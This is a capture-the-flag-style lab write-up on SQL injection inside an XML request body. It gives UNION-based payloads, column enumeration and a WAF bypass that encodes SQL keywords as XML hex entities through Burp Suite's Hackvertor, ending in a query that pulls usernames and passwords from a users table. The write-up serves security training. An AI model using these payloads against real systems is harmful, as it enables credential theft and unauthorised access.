# SQL Injection in Different Contexts - XML WAF Bypass

## Overview

SQL injection can occur in different types of user-controlled input, not only in URL parameters.

Possible injection points include:

- URL parameters
- Cookies
- JSON
- XML
- Form parameters
- HTTP headers

In this lab, the SQL injection occurred inside an XML request.

---

## XML Request

The vulnerable request used the following structure:

    <stockCheck>
        <productId>2</productId>
        <storeId>1+1</storeId>
    </stockCheck>

The value:

    1+1

was evaluated by the backend, indicating that the input was being incorporated into an SQL query.

---

## Testing UNION Injection

A UNION-based payload was tested:

    1 UNION SELECT NULL

The application returned:

    403 Attack detected

This indicated that a Web Application Firewall (WAF) was blocking the SQL injection keywords.

---

## Bypassing the WAF with XML Entity Encoding

Instead of sending the SQL keyword directly, XML character entities can be used.

For example:

    &#x53;ELECT

is decoded by the XML parser as:

    SELECT

This can bypass weak WAF filters that search for keywords before XML decoding.

---

## Hackvertor

Burp Suite's Hackvertor extension was used to encode the SQL payload.

The workflow was:

    Right click payload
        ↓
    Extensions
        ↓
    Hackvertor
        ↓
    Encode
        ↓
    hex_entities

The SQL keyword was then represented using XML hexadecimal entities.

---

## Determining the Number of Columns

After bypassing the WAF, the following payload was tested:

    1 UNION SELECT NULL

The response indicated that the query accepted one column.

This was confirmed by testing:

    1 UNION SELECT NULL,NULL

The response changed, indicating that the original query returned only one column.

---

## Extracting Multiple Values from One Column

Because only one column was available, multiple values could be concatenated.

Example:

    username || '~' || password

The complete query was:

    1 UNION SELECT username || '~' || password FROM users

The values could then be returned through the single available column.

---

## Final XML Payload

The SQL payload was encoded using Hackvertor inside the XML request:

    <storeId>
        <@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>
    </storeId>

The application returned information from the `users` table.

The retrieved credentials were then used to authenticate as the administrator account and complete the lab.

---

## Practical Workflow

    1. Identify the injection point
            ↓
    2. Confirm that SQL expressions are evaluated
            ↓
    3. Test a UNION payload
            ↓
    4. Identify WAF filtering
            ↓
    5. Encode SQL keywords using XML entities
            ↓
    6. Bypass the WAF
            ↓
    7. Determine the number of columns
            ↓
    8. Identify a usable column
            ↓
    9. Concatenate multiple values if necessary
            ↓
    10. Retrieve the required database information

---

## Key Takeaways

- SQL injection can occur inside XML input.
- WAFs may block obvious SQL keywords.
- XML entity encoding can bypass weak keyword-based filtering.
- Hackvertor can automate the encoding process in Burp Suite.
- The number of columns must match when using `UNION SELECT`.
- When only one column is available, multiple values can be concatenated.
- WAF bypasses should be tested by understanding how the application parses and transforms the input.